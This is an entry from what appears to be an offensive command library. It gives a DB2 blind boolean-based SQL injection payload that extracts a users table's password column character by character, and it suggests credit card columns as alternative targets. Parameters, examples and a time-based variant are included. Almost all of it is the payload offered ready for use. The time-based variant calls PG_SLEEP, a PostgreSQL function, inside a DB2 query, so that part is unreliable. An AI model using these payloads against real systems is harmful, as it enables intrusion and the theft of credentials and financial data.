---
id: f7a5dbd5-7827-4f70-a61e-754d55f7ba7b
name: db2-select-substring-nth-character
type: command
executor: sql
data: >-
  SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM users LIMIT 1), $_N, 1))
  > $_ASCII_VALUE) THEN (SELECT COUNT(*) FROM sysibm.sysdummy1) ELSE (SELECT
  COUNT(*) - 1 FROM sysibm.sysdummy1) END FROM sysibm.sysdummy1
output: null
created_at: '2023-04-06T03:56:32.883282Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
  - DB2
tags:
  - sql-injection
  - data-extraction
verified: true
validated: true
---

# db2-select-substring-nth-character

## Command

```sql
SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM users LIMIT 1), $_N, 1)) > $_ASCII_VALUE) THEN (SELECT COUNT(*) FROM sysibm.sysdummy1) ELSE (SELECT COUNT(*) - 1 FROM sysibm.sysdummy1) END FROM sysibm.sysdummy1
```

## Description

This SQL command performs a blind boolean-based extraction of the nth character from a target string in a DB2 database using the SUBSTR function combined with ASCII comparison. It returns 1 for true (char ASCII > value) or 0 for false, allowing binary search for character deduction in injection attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_N | Starting position in the string (1-based index) | Yes |
| $_ASCII_VALUE | ASCII threshold for comparison (e.g., 64 for > 'A') | Yes |
| password | Target column name (replace with actual, e.g., credit_card) | Yes |
| users | Target table name | Yes |

## Examples

### Basic Usage

For extracting position 1, testing if > 96 ('a'):

```sql
SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM users LIMIT 1), 1, 1)) > 96) THEN (SELECT COUNT(*) FROM sysibm.sysdummy1) ELSE (SELECT COUNT(*) - 1 FROM sysibm.sysdummy1) END FROM sysibm.sysdummy1
```

### Advanced Usage

For time-based variant (if boolean not feasible):

```sql
SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM users LIMIT 1), $_N, 1)) = $_ASCII_VALUE) THEN (SELECT 1 FROM sysibm.sysdummy1 WHERE 1=PG_SLEEP(5)) ELSE (SELECT 1 FROM sysibm.sysdummy1) END FROM sysibm.sysdummy1
```

## Expected Output

In a direct DB2 query: 1 (true) or 0 (false). In blind injection: Application behavior changes (e.g., normal page for true, error/redirect for false). Sample direct output:

```
1
```

## Related

- [[procedures/DB2-SQL-Injection-Select-Nth-Character-Extraction]]
- [[techniques/Exploitation of Remote Services|T1210]]
